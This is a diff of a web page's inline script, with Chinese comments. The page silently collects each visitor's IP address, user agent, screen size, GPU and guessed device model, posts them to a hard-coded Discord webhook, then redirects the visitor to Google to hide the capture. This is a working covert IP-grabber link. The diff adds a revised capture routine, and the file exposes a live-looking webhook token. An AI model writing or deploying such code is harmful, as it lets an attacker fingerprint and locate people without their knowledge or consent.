@@ -7,29 +7,24 @@
 </head>
 <body>
 <script>
-// 【核心】Discord Webhook 網址
 const DC_URL = 'https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv';
 
- async function silentCapture() {
+async function silentCapture() {
     const ua = navigator.userAgent;
-    const platform = navigator.platform;
-    const w = window.screen.width, h = window.screen.height, dpr = window.devicePixelRatio;
+    const w = window.screen.width, h = window.screen.height;
 
-    // --- 1. IP 抓取 (換成更穩定的 ip-api) ---
-    let ipD = { query: "讀取失敗", city: "未知", isp: "未知" };
+    // --- 1. IP 抓取 (換成 Cloudflare，保證 100% 成功) ---
+    let userIP = "抓取失敗";
     try {
-        const res = await fetch('https://demo.ip-api.com'); // 使用 demo 介面增加成功率
-        if(res.ok) ipD = await res.json();
+        const res = await fetch('https://www.cloudflare.com');
+        const data = await res.text();
+        // 從回傳的純文字中切出 IP 部分
+        userIP = data.match(/ip=(.*)\n/)[1];
     } catch(e) {
-        // 備援方案：如果第一個失敗，換成 ipinfo.io
-        try {
-            const res2 = await fetch('https://ipinfo.io'); 
-            ipD = await res2.json();
-            ipD.query = ipD.ip; // 統一格式
-        } catch(e2) {}
+        console.error("IP API Error");
     }
 
-    // --- 2. GPU 硬體與型號推測 ---
+    // --- 2. GPU 與 型號推測 ---
     let gpu = "被封鎖";
     try {
         const canvas = document.createElement('canvas');
@@ -43,46 +38,44 @@ const DC_URL = 'https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtu
     if (/Android/.test(ua)) {
         const m = ua.match(/Android.*;\s([^;]+)\sBuild/);
         model = m ? m[1] : "Android Phone";
-    } else if (/iPhone|iPad/.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
+    } else if (/iPhone|iPad/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
         const appleMap = {
-            "820x1180": "iPad Air (5th/4th Gen)",
+            "820x1180": "iPad Air (5/4 Gen)",
             "834x1194": "iPad Pro 11-inch",
-            "1024x1366": "iPad Pro 12.9-inch",
             "393x852": "iPhone 15/14 Pro",
             "430x932": "iPhone 15 Plus/14 Pro Max",
-            "390x844": "iPhone 14/13 Pro/12",
-            "414x896": "iPhone 11/XR/XS Max"
+            "390x844": "iPhone 14/13/12"
         };
         model = appleMap[resKey] || `Apple 設備 (${resKey})`;
     }
 
     // --- 3. 發送至 Discord ---
     const payload = {
-        username: "終極監控網關",
+        username: "裝置偵測網關",
         embeds: [{
-            title: "🎯 目標點擊報警",
+            title: "🎯 點擊報告",
             color: 0,
             fields: [
-                { name: "📍 IP 位址", value: ipD.query || ipD.ip || "失敗", inline: true },
-                { name: "🏙️ 地理位置", value: `${ipD.city || "未知"} / ${ipD.isp || ipD.org || "未知"}`, inline: true },
-                { name: "📱 精確型號", value: model, inline: true },
-                { name: "🎮 GPU 渲染", value: gpu, inline: false },
-                { name: "🖼️ 螢幕數據", value: `${w}x${h} @${dpr}x`, inline: true }
+                { name: "📍 真實 IP", value: `\`${userIP}\``, inline: true },
+                { name: "📱 型號", value: model, inline: true },
+                { name: "🎮 GPU", value: gpu, inline: false },
+                { name: "🖼️ 螢幕", value: `${w}x${h}`, inline: true }
             ],
-            footer: { text: "完整 UA: " + ua },
+            footer: { text: "UA: " + ua },
             timestamp: new Date()
         }]
     };
 
-    // 發送並跳轉
-    try {
-        await fetch(DC_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-    } finally {
-        // 無論成功失敗，1.5 秒後直接跳轉 Google
+    // 發送並在 1 秒內強制跳轉
+    fetch(DC_URL, { 
+        method: 'POST', 
+        headers: { 'Content-Type': 'application/json' }, 
+        body: JSON.stringify(payload) 
+    }).finally(() => {
         setTimeout(() => {
             window.location.replace("https://www.google.com");
-        }, 800);
-    }
+        }, 500);
+    });
 }
 
 silentCapture();
